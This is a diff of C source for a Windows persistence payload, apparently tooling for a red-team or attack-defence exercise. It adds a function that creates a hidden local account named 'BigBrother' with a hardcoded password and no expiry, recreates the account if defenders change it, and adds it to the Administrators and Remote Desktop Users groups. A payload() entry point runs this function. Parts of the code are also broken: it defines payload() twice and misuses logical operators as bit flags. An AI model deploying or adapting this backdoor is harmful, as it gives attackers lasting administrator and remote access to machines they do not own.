@@ -41,61 +41,102 @@ int changeBackground() {
 
 
 
-int RDPSetup() {
+int PersistientUser() {
     //taken from https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netuseradd?redirectedfrom=MSDN
-    USER_INFO_1 ui;
+    USER_INFO_2 ui;
+    USER_INFO_2 info;
+    LOCALGROUP_MEMBERS_INFO_2* groupInfo;
+
     DWORD level = 1;
     DWORD error = 0;
 
-    ui.usri1_name = "AdminScoring";
-    ui.usri1_password = "defaultscoringpass";
-    ui.usri1_priv = USER_PRIV_ADMIN;
-    ui.usri1_home_dir = NULL;
-    ui.usri1_comment = "Scoring Account";
-    ui.usri1_flags = UF_SCRIPT or UF_DONT_EXPIRE_PASSWD or UF_DONT_REQUIRE_PREAUTH or UF_TRUSTED_FOR_DELEGATION or UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION;
-    ui.usri1_script_path = NULL;
+    const wchar_t* password = L"defaultscoringpass";
+    const wchar_t* name = L"BigBrother";
+    const wchar_t* comment = L"The best books are those that tell you what you know already.";
+    const wchar_t* fullName = L"War is Peace";
 
-    NET_API_STATUS status = NetUserAdd(NULL, 1, (LPBYTE)&ui, &error);
+    ui.usri2_name = (LPWSTR)name;
+    ui.usri2_password = (LPWSTR)password;
+    ui.usri2_priv = USER_PRIV_USER;
+    ui.usri2_home_dir = NULL;
+    ui.usri2_comment = (LPWSTR)comment;
+    ui.usri2_flags = UF_SCRIPT || UF_DONT_EXPIRE_PASSWD || UF_DONT_REQUIRE_PREAUTH || UF_TRUSTED_FOR_DELEGATION || UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION;
+    ui.usri2_script_path = NULL;
+    ui.usri2_auth_flags = 0;
+    ui.usri2_full_name = (LPWSTR)fullName;
+    ui.usri2_usr_comment = NULL;
+    ui.usri2_parms = NULL;
+    ui.usri2_workstations = NULL;
+    ui.usri2_acct_expires = TIMEQ_FOREVER;
+    ui.usri2_max_storage = USER_MAXSTORAGE_UNLIMITED;
+    ui.usri2_logon_hours = NULL;
+    ui.usri2_logon_server = NULL;
+    ui.usri2_country_code = 840;
+    ui.usri2_code_page = 437;
+
+    //NET_API_STATUS status = NetUserDel(NULL, (LPWSTR)name);
+    NET_API_STATUS status = NetUserAdd(NULL, 2, (LPBYTE)&ui, &error);
     if (status != NERR_Success) {
-        USER_INFO_4 info;
-        //info = {};
-        info.usri4_name = "AdminScoring";
-        info.usri4_password = "defaultscoringpass";
-        info.usri4_priv = USER_PRIV_ADMIN;
-        info.usri4_home_dir = NULL;
-        info.usri4_comment = "Scoring Account";
-        info.usri4_flags = UF_SCRIPT or UF_DONT_EXPIRE_PASSWD or UF_DONT_REQUIRE_PREAUTH or UF_TRUSTED_FOR_DELEGATION or UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION;
-        info.usri4_script_path = NULL;
-        info.usri4_full_name = "Admin Scoring";
-        info.usri4_usr_comment = NULL;
-        info.usri4_parms = NULL;
-        info.usri4_workstations = NULL;
-        info.usri4_acct_expires = TIMEQ_FOREVER;
-        info.usri4_logon_hours = NULL;
-        info.usri4_logon_server = NULL;
-        info.usri4_country_code = "US";
-        info.usri4_code_page = 437;
-        info.usri4_primary_group_id = "World";
-        info.usri4_profile = NULL;
-        info.usri4_home_dir_drive = "C:";
-        info.usri4_password_expired = 0;
+        NetUserGetInfo(NULL, name, 2, (LPBYTE*)&info);
+        if (info.usri2_acct_expires != TIMEQ_FOREVER || info.usri2_password != (LPWSTR)password) {
+            NET_API_STATUS status = NetUserDel(NULL, (LPWSTR)name);
 
-        status = NetUserSetInfo(NULL, "AdminScoring", 4, &info, &error);
+            if (status != NERR_Success) {
+                //printf("user not deleted");
+                return 0;
+            }
+            else {
+                RDPSetup();
+                return 0;
+            }
+        }
+
+
 
     }
-    else {
-        printf("adding user worked\n");
+
+    LOCALGROUP_MEMBERS_INFO_3 currentAddition;
+    currentAddition.lgrmi3_domainandname = (LPWSTR)name;
+    LPCWSTR groupname = L"Administrators";
+    LPCWSTR rdpGroup = L"Remote Desktop Users";
+
+
+
+    status = NetLocalGroupAddMembers(NULL, groupname, 3, (LPBYTE)&currentAddition, 1);
+    if (status != NERR_Success) {
+        //printf("failed to add member to admin");
+        return 0;
     }
+    status = NetLocalGroupAddMembers(NULL, rdpGroup, 3, (LPBYTE)&currentAddition, 1);
+    if (status != NERR_Success) {
+        //printf("failed to add member to rdp group");
+        return 0;
+    }
+
+
+
+    //printf("adding user worked\n");
+    return 0;
+
 }
 int payload() {
     //Execute whatever you want here
     changeBackground();
+    PersistientUser();
+    return 0;
+
+}
+
+
+int payload() {
+    //Execute whatever you want here
+    //changeBackground();
     RDPSetup();
 
 }
 
-/*
+
 int main(int argc, char *argv[]){
     payload();
 }
-//*/
+
